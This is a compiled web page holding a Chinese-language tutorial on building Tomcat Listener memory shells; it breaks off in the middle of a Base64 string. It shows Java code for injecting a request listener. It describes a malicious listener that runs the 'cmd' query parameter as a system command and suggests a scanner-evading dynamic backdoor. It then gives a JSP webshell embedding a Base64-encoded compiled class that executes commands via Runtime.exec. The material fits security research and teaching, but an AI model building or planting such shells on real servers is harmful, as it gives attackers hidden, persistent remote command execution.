import{_ as e}from"./plugin-vue_export-helper-DlAUqK2U.js";import{c as a,a as i,o as n}from"./app-DX9gUdjC.js";const t={};function l(A,s){return n(),a("div",null,s[0]||(s[0]=[i(`<h1 id="tomcat-listener-内存马" tabindex="-1"><a class="header-anchor" href="#tomcat-listener-内存马"><span>Tomcat Listener 内存马</span></a></h1><blockquote><p><a href="https://su18.org/post/memory-shell/#listener-%E5%86%85%E5%AD%98%E9%A9%AC" target="_blank" rel="noopener noreferrer">JavaWeb 内存马一周目通关攻略 | 素十八 (su18.org)</a></p></blockquote><hr><ul><li><a href="#tomcat-listener-%E5%86%85%E5%AD%98%E9%A9%AC">Tomcat Listener 内存马</a><ul><li><a href="#listener%E5%86%85%E5%AD%98%E9%A9%AC%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86">Listener内存马基本知识</a></li><li><a href="#listener%E5%86%85%E5%AD%98%E9%A9%AC%E7%A4%BA%E4%BE%8B">Listener内存马示例</a><ul><li><a href="#%E7%A4%BA%E4%BE%8B%E6%95%88%E6%9E%9C">示例效果</a></li><li><a href="#%E6%95%B4%E4%BD%93%E6%80%9D%E8%B7%AF">整体思路</a></li><li><a href="#%E7%A4%BA%E4%BE%8B%E6%9E%84%E9%80%A0">示例构造</a><ul><li><a href="#%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87">环境准备</a></li><li><a href="#%E5%88%B6%E4%BD%9Clistener">制作Listener</a></li><li><a href="#%E7%BC%96%E8%AF%91-listener-%E7%84%B6%E5%90%8E%E5%B0%86-class-%E6%96%87%E4%BB%B6%E8%BD%AC%E6%8D%A2%E4%B8%BA-base64-%E5%AD%97%E7%AC%A6%E4%B8%B2">编译 Listener 然后将 class 文件转换为 Base64 字符串</a></li><li><a href="#%E7%BC%96%E5%86%99listener%E6%B3%A8%E5%86%8C%E4%BB%A3%E7%A0%81">编写Listener注册代码</a></li><li><a href="#%E7%BC%96%E8%AF%91%E5%B9%B6%E9%83%A8%E7%BD%B2war%E5%8C%85">编译并部署war包</a></li><li><a href="#%E7%BC%96%E5%86%99%E5%B9%B6%E6%B3%A8%E5%86%8C%E6%81%B6%E6%84%8Flistener">编写并注册恶意Listener</a></li></ul></li></ul></li><li><a href="#%E5%85%B6%E4%BB%96%E7%94%A8%E6%B3%95%E6%80%9D%E8%B7%AF">其他用法思路</a></li><li><a href="#jsp%E9%A9%AC">JSP马</a></li></ul></li></ul><hr><h2 id="listener内存马基本知识" tabindex="-1"><a class="header-anchor" href="#listener内存马基本知识"><span>Listener内存马基本知识</span></a></h2><p>Servlet 和 Filter 相对于 Listener 更常用, 因此更容易找到内存马注入的相关材料, 而 Listener 相对而言就冷门了一些</p><p>Listener(监听器)用于监听对象/流程的创建与销毁，通过 Listener 可以自动触发一些操作，因此依靠它也可以完成内存马的实现。</p><p>先来了解一下 Listener 是干什么的，看一下 Servlet API 中的注释。</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202409301705658.png" alt="image-20240930170541398"></p><p>在应用中可能调用的监听器如下：</p><ul><li>ServletContextListener：用于监听整个 Servlet 上下文（创建、销毁）</li><li>ServletContextAttributeListener：对 Servlet 上下文属性进行监听（增删改属性）</li><li>ServletRequestListener：对 Request 请求进行监听（创建、销毁）</li><li>ServletRequestAttributeListener：对 Request 属性进行监听（增删改属性）</li><li>javax.servlet.http.HttpSessionListener：对 Session 整体状态的监听</li><li>javax.servlet.http.HttpSessionAttributeListener：对 Session 属性的监听</li></ul><p>可以看到 Listener 也是为一次访问的请求或生命周期进行服务的，在上述每个不同的接口中，都提供了不同的方法，用来在监听的对象发生改变时进行触发。而这些类接口，实际上都是 <code>java.util.EventListener</code> 的子接口。</p><p>这里我们看到，在<code> ServletRequestListener</code> 接口中，提供了两个方法在 request 请求创建和销毁时进行处理，比较适合我们用来做内存马。</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202410071915963.png" alt="image-20241007191534811"></p><blockquote><p>除了这个 Listener，其他的 Listener 在某些情况下也可以触发作为内存马的实现，<a href="https://su18.org/post/memory-shell/#listener-%E5%86%85%E5%AD%98%E9%A9%AC" target="_blank" rel="noopener noreferrer">原文</a>里没有对每个都进行触发测试，感兴趣的师傅可以自测。</p><hr><p>PS: 这里沿着原文作者的思路梳理 Listener 内存马原理, 也暂且不会对其他 Listener 做单独测试</p></blockquote><p>ServletRequestListener 提供两个方法：<code>requestInitialized</code> 和 <code>requestDestroyed</code>，两个方法均接收 ServletRequestEvent 作为参数，ServletRequestEvent 中又储存了 ServletContext 对象和 ServletRequest 对象，因此在访问请求过程中我们可以在 request 创建和销毁时实现自己的恶意代码，完成内存马的实现。</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202410081826508.png" alt="image-20241008182622322"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202410081826652.png" alt="image-20241008182652523"></p><p>Tomcat 中 EventListeners 存放在 StandardContext 的 applicationEventListenersObjects 属性中，同样可以使用 StandardContext 的相关 add 方法添加。</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202410091412648.png" alt="image-20241009141200546"></p><hr><h2 id="listener内存马示例" tabindex="-1"><a class="header-anchor" href="#listener内存马示例"><span>Listener内存马示例</span></a></h2><h3 id="示例效果" tabindex="-1"><a class="header-anchor" href="#示例效果"><span>示例效果</span></a></h3><p>我们还是实现一个简单的功能，在 requestDestroyed 方法中获取 response 对象，向页面原本输出多写出一个字符串。</p><p>正常访问时：</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202410091730152.png" alt="image-20241009173049025"></p><p>添加 Listener，可以看到，由于我们是在 requestDestroyed 中植入恶意逻辑，那么在本次请求中就已经生效了：</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202410091731434.png" alt="image-20241009173123380"></p><p>访问之前的路径也生效了：</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202410091731153.png" alt="image-20241009173144092"></p><hr><h3 id="整体思路" tabindex="-1"><a class="header-anchor" href="#整体思路"><span>整体思路</span></a></h3><p>编写恶意 Listener 编译得到 class 文件, 将 class 文件编码为 Base64 字符串, 编写相应的解码程序, 并利用强制类型转换转换为 Java 对象, 获取到 StandardContext 之后利用 addApplicationEventListener 方法注册恶意 Listener</p><hr><h3 id="示例构造" tabindex="-1"><a class="header-anchor" href="#示例构造"><span>示例构造</span></a></h3><h4 id="环境准备" tabindex="-1"><a class="header-anchor" href="#环境准备"><span>环境准备</span></a></h4><p>开发和测试环境还是沿用前面 Tomcat Filter/Servlet 内存马的环境</p><ul><li><p>开发环境: jdk21 + Maven 3.9.9</p><p>项目结构如下, 有链接的为新增文件</p><ul><li><code>src/main</code><ul><li><code>java/com/summer233</code><ul><li>DemoServlet.java</li><li>IndexServlet.java</li><li><a href="https://github.com/233Official/DailyNotesCode/blob/main/Security/Web/MemShell/Java/Tomcat/ServletAPI/TomcatServletAPIMemshell/src/main/java/com/summer233/SummerBasicListener.java" target="_blank" rel="noopener noreferrer">SummerBasicListener.java</a></li><li><a href="https://github.com/233Official/DailyNotesCode/blob/main/Security/Web/MemShell/Java/Tomcat/ServletAPI/TomcatServletAPIMemshell/src/main/java/com/summer233/DynamicUtils.java" target="_blank" rel="noopener noreferrer">DynamicUtils.java</a></li><li><a href="https://github.com/233Official/DailyNotesCode/blob/main/Security/Web/MemShell/Java/Tomcat/ServletAPI/TomcatServletAPIMemshell/src/main/java/com/summer233/AddTomcatListener.java" target="_blank" rel="noopener noreferrer">AddTomcatListener.java</a></li><li><a href="https://github.com/233Official/DailyNotesCode/blob/main/Security/Web/MemShell/Java/Tomcat/ServletAPI/TomcatServletAPIMemshell/src/main/java/com/summer233/SummerCMDListener.java" target="_blank" rel="noopener noreferrer">SummerCMDListener</a></li></ul></li><li><code>webapp/WEB-INF</code><ul><li>web.xml</li></ul></li></ul></li><li>pom.xml</li></ul></li><li><p>测试环境: tomcat:8 docker (Tomcat 8.5.100)</p></li></ul><hr><h4 id="制作listener" tabindex="-1"><a class="header-anchor" href="#制作listener"><span>制作Listener</span></a></h4><p>实现一个 <code>ServletRequestListener</code> 重写其中的 <code>requestDestroyed</code> 方法</p><p>通过 ServletRequestEvent 对象获取当前的 ServletRequest，并将其强制转换为 RequestFacade 类型。</p><p>接着，使用反射机制获取 RequestFacade 类中的私有字段 request。通过调用 Field 对象的 setAccessible(true) 方法，使得这个私有字段可以被访问。然后，通过 Field 对象的 get 方法获取实际的 Request 对象</p><p>获取到 Request 对象后，调用其 <code>getResponse().getWriter().println()</code> 方法，在响应中写入一行文本</p><div class="language-java line-numbers-mode" data-highlighter="shiki" data-ext="java" data-title="java" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">package</span><span style="--shiki-light:#383A42;--shiki-dark:#C678DD;"> com.summer233</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">import</span><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;"> java.lang.reflect.Field</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">import</span><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;"> javax.servlet.ServletRequestEvent</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">import</span><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;"> javax.servlet.ServletRequestListener</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">import</span><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;"> org.apache.catalina.connector.Request</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">import</span><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;"> org.apache.catalina.connector.RequestFacade</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">public</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;"> class</span><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;"> BasicListener</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;"> implements</span><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;"> ServletRequestListener</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> {</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">   public</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;"> BasicListener</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">()</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> {</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">   }</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">   public</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;"> void</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;"> requestDestroyed</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;">ServletRequestEvent</span><span style="--shiki-light:#383A42;--shiki-light-font-style:inherit;--shiki-dark:#E06C75;--shiki-dark-font-style:italic;"> servletRequestEvent</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">)</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> {</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">      try</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> {</span></span>
<span class="line"><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;">         RequestFacade</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;"> request</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> =</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> (RequestFacade) </span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">servletRequestEvent</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">getServletRequest</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">();</span></span>
<span class="line"><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;">         Field</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;"> f</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> =</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;"> request</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">getClass</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">().</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">getDeclaredField</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;request&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">);</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">         f</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">setAccessible</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">true</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">);</span></span>
<span class="line"><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;">         Request</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;"> req</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> =</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> (Request) </span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">f</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">get</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(request);</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">         req</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">getResponse</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">().</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">getWriter</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">().</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">println</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\\n</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">BasicListener requestDestroyed Injected&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">);</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">      } </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">catch</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> (</span><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;">Exception</span><span style="--shiki-light:#383A42;--shiki-light-font-style:inherit;--shiki-dark:#E06C75;--shiki-dark-font-style:italic;"> var5</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">) {</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">         var5</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">printStackTrace</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">();</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">      }</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">   }</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">   public</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;"> void</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;"> requestInitialized</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;">ServletRequestEvent</span><span style="--shiki-light:#383A42;--shiki-light-font-style:inherit;--shiki-dark:#E06C75;--shiki-dark-font-style:italic;"> servletRequestEvent</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">)</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> {</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">   }</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">}</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><hr><h4 id="编译-listener-然后将-class-文件转换为-base64-字符串" tabindex="-1"><a class="header-anchor" href="#编译-listener-然后将-class-文件转换为-base64-字符串"><span>编译 Listener 然后将 class 文件转换为 Base64 字符串</span></a></h4><p>直接 <code>mvn clean package</code> 编译项目然后在 <code>target/classes</code> 中找到该 Listener 的 class 文件</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202410091540059.png" alt="image-20241009154044903"></p><p>将其转换为 Base64 字符串</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202410091543132.png" alt="image-20241009154347040"></p><hr><h4 id="编写listener注册代码" tabindex="-1"><a class="header-anchor" href="#编写listener注册代码"><span>编写Listener注册代码</span></a></h4><p><img src="http://cdn.ayusummer233.top/DailyNotes/202410091555851.png" alt="image-20241009155502792"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202410091608367.png" alt="image-20241009160811300"></p><hr><h4 id="编译并部署war包" tabindex="-1"><a class="header-anchor" href="#编译并部署war包"><span>编译并部署war包</span></a></h4><p><code>mvn clean package</code> 编译后取 <code>target</code> 中的 war 包放置到 <code>tomcat:8</code> 的 webapps 目录下自动部署</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202410091609777.png" alt="image-20241009160933681"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202410091611618.png" alt="image-20241009161108540"></p><p>访问这个 webapp 的默认页面: <code>/tomcat-servletapi-memshell-listener-0.1</code>:</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202410091612756.png" alt="image-20241009161245707"></p><p>访问 <code>/dynamicAddListener</code> 注册 Listener:</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202410091614023.png" alt="image-20241009161434970"></p><p>刷新一下默认页面:</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202410091614776.png" alt="image-20241009161456731"></p><hr><h4 id="编写并注册恶意listener" tabindex="-1"><a class="header-anchor" href="#编写并注册恶意listener"><span>编写并注册恶意Listener</span></a></h4><p>像前面 Filter,Servlet 内存马中那样编写一个将 Query 参数 <code>cmd</code> 的值作为系统命令执行并打印输出的恶意 Listener:</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202410091630516.png" alt="image-20241009163029448"></p><hr><p>编译得到对应 class 文件, 然后转换成 Base64 字符串:</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202410091636399.png" alt="image-20241009163618307"></p><hr><p>编写注册代码:</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202410091639794.png" alt="image-20241009163945700"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202410091639185.png" alt="image-20241009163958115"></p><hr><p>编译生成 war 包:</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202410091645349.png" alt="image-20241009164500263"></p><hr><p>部署到 <code>tomcat:8</code> 的 webapps 目录下</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202410091646773.png" alt="image-20241009164601683"></p><hr><p>测试效果:</p><p><code>/tomcat-servletapi-memshell-listener-0.2</code>:</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202410091730152.png" alt="image-20241009173049025"></p><p><code>/tomcat-servletapi-memshell-listener-0.2/dynamicAddListener</code>:</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202410091731434.png" alt="image-20241009173123380"></p><p><code>/tomcat-servletapi-memshell-listener-0.2/?cmd=id</code>:</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202410091731153.png" alt="image-20241009173144092"></p><hr><h2 id="其他用法思路" tabindex="-1"><a class="header-anchor" href="#其他用法思路"><span>其他用法思路</span></a></h2><p><a href="https://su18.org/post/memory-shell/#listener-%E5%86%85%E5%AD%98%E9%A9%AC" target="_blank" rel="noopener noreferrer">JavaWeb 内存马一周目通关攻略 | 素十八 (su18.org)</a> 作者后记:</p><p>除了 EventListener，Tomcat 还存在了一个 LifecycleListener ，当然也肯定有可以用来触发的实现类，但是用起来一定是不如 ServletRequestListener ，但是也可以关注一下。这里将不会进行演示。</p><p>由于在 ServletRequestListener 中可以获取到 ServletRequestEvent，这其中又存了很多东西，ServletContext/StandardContext 都可以获取到，那玩法就变得更多了。可以根据不同思路实现很多非常神奇的功能，我举个例子：</p><ul><li>在 requestInitialized 中监听，如果访问到了某个特定的 URL，或这次请求中包含某些特征（可以拿到 request 对象，随便怎么定义），则新起一个线程去 StandardContext 中注册一个 Filter，可以实现某些恶意功能。</li><li>在 requestDestroyed 中再起一个新线程 sleep 一定时间后将我们添加的 Filter 卸载掉。</li></ul><p>这样我们就有了一个真正的动态后门，只有用的时候才回去注册它，用完就删。平常使用扫内存马的软件也根本扫不出来。这个例子也是我突然拍脑袋想出来的，可能实际意义并不大，但是可以看出 Listener 内存马的危害性和玩法的变化要大于 Filter/Servlet 内存马的。</p><hr><h2 id="jsp马" tabindex="-1"><a class="header-anchor" href="#jsp马"><span>JSP马</span></a></h2><p>类似前面构造 Servlet JSP 马一样来写, 需要额外导入一个 <code>javax.servlet.ServletRequestListener</code> 来做类型转换:</p><div class="language-jsp line-numbers-mode" data-highlighter="shiki" data-ext="jsp" data-title="jsp" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>&lt;%@ page contentType=&quot;text/html; charset=UTF-8&quot; pageEncoding=&quot;UTF-8&quot;%&gt;</span></span>
<span class="line"><span>&lt;%@ page import=&quot;org.apache.catalina.core.StandardContext&quot; %&gt;</span></span>
<span class="line"><span>&lt;%@ page import=&quot;org.apache.catalina.Wrapper&quot; %&gt; </span></span>
<span class="line"><span>&lt;%@ page import=&quot;java.lang.reflect.Field&quot; %&gt;</span></span>
<span class="line"><span>&lt;%@ page import=&quot;java.util.Base64&quot; %&gt;</span></span>
<span class="line"><span>&lt;%@ page import=&quot;java.lang.reflect.Method&quot; %&gt;</span></span>
<span class="line"><span>&lt;%@ page import=&quot;javax.servlet.ServletRequestListener&quot; %&gt;</span></span>
<span class="line"><span></span></span>
<span class="line"><span>&lt;%!</span></span>
<span class="line"><span>    String SUMMER_CMD_LISTENER_CLASS_STRING_BASE64 = &quot;yv66vgAAAEEAzwoAAgADBwAEDAAFAAYBABBqYXZhL2xhbmcvT2JqZWN0AQAGPGluaXQ+AQADKClWCgAIAAkHAAoMAAsADAEAIWphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3RFdmVudAEAEWdldFNlcnZsZXRSZXF1ZXN0AQAgKClMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdDsHAA4BACtvcmcvYXBhY2hlL2NhdGFsaW5hL2Nvbm5lY3Rvci9SZXF1ZXN0RmFjYWRlCgACABAMABEAEgEACGdldENsYXNzAQATKClMamF2YS9sYW5nL0NsYXNzOwgAFAEAB3JlcXVlc3QKABYAFwcAGAwAGQAaAQAPamF2YS9sYW5nL0NsYXNzAQAQZ2V0RGVjbGFyZWRGaWVsZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwoAHAAdBwAeDAAfACABABdqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZAEADXNldEFjY2Vzc2libGUBAAQoWilWCgAcACIMACMAJAEAA2dldAEAJihMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7BwAmAQAlb3JnL2FwYWNoZS9jYXRhbGluYS9jb25uZWN0b3IvUmVxdWVzdAoAJQAoDAApACoBAAtnZXRSZXNwb25zZQEAKigpTG9yZy9hcGFjaGUvY2F0YWxpbmEvY29ubmVjdG9yL1Jlc3BvbnNlOwgALAEAGHRleHQvaHRtbDsgY2hhcnNldD1VVEYtOAsALgAvBwAwDAAxADIBAB1qYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZQEADnNldENvbnRlbnRUeXBlAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWCAA0AQAFVVRGLTgLAC4ANgwANwAyAQAUc2V0Q2hhcmFjdGVyRW5jb2RpbmcLAC4AOQwAOgA7AQAJZ2V0V3JpdGVyAQAXKClMamF2YS9pby9QcmludFdyaXRlcjsIAD0BAB90aGlzIGlzIGEgU3VtbWVyQ01ETGlzdGVuZXI8YnI+CgA/AEAHAEEMAEIAMgEAE2phdmEvaW8vUHJpbnRXcml0ZXIBAAdwcmludGxuCABEAQADY21kCwBGAEcHAEgMAEkASgEAJWphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3QBAAxnZXRQYXJhbWV0ZXIBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwcATAEAGGphdmEvbGFuZy9Qcm9jZXNzQnVpbGRlcgcATgEAEGphdmEvbGFuZy9TdHJpbmcIAFABAAZ3aG9hbWkKAEsAUgwABQBTAQAWKFtMamF2YS9sYW5nL1N0cmluZzspVgoASwBVDABWAFcBAAVzdGFydAEAFSgpTGphdmEvbGFuZy9Qcm9jZXNzOwoAWQBaBwBbDABcAF0BABFqYXZhL2xhbmcvUHJvY2VzcwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsHAF8BABFqYXZhL3V0aWwvU2Nhbm5lcgoAXgBhDAAFAGIBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYIAGQBAAJcYQoAXgBmDABnAGgBAAx1c2VEZWxpbWl0ZXIBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL3V0aWwvU2Nhbm5lcjsKAF4AagwAawBsAQAHaGFzTmV4dAEAAygpWgoAXgBuDABvAHABAARuZXh0AQAUKClMamF2YS9sYW5nL1N0cmluZzsIAHIBAAAIAHQBAAFcCgBNAHYMAHcAeAEACGNvbnRhaW5zAQAbKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlOylaCgBeAHoMAHsABgEABWNsb3NlBwB9AQATamF2YS9sYW5nL1Rocm93YWJsZQoAfAB/DACAAIEBAA1hZGRTdXBwcmVzc2VkAQAYKExqYXZhL2xhbmcvVGhyb3dhYmxlOylWCACDAQACc2gIAIUBAAItYwgAhwEAB2NtZC5leGUIAIkBAAIvYwoAiwCMBwCNDACOAI8BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsKAIsAkQwAkgCTAQAEZXhlYwEAKChbTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsKAD8AlQwAlgAGAQAFZmx1c2gKAD8AegcAmQEAE2phdmEvbGFuZy9FeGNlcHRpb24KAJgAmwwAnAAGAQAPcHJpbnRTdGFja1RyYWNlBwCeAQAfY29tL3N1bW1lcjIzMy9TdW1tZXJDTURMaXN0ZW5lcgcAoAEAJGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3RMaXN0ZW5lcgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAhTGNvbS9zdW1tZXIyMzMvU3VtbWVyQ01ETGlzdGVuZXI7AQAQcmVxdWVzdERlc3Ryb3llZAEAJihMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdEV2ZW50OylWAQAIb3V0cHV0T1MBABJMamF2YS9sYW5nL1N0cmluZzsBAAlzY2FubmVyT1MBABNMamF2YS91dGlsL1NjYW5uZXI7AQAOcmVzcG9uc2VXcml0ZXIBABVMamF2YS9pby9QcmludFdyaXRlcjsBAAZvdXRw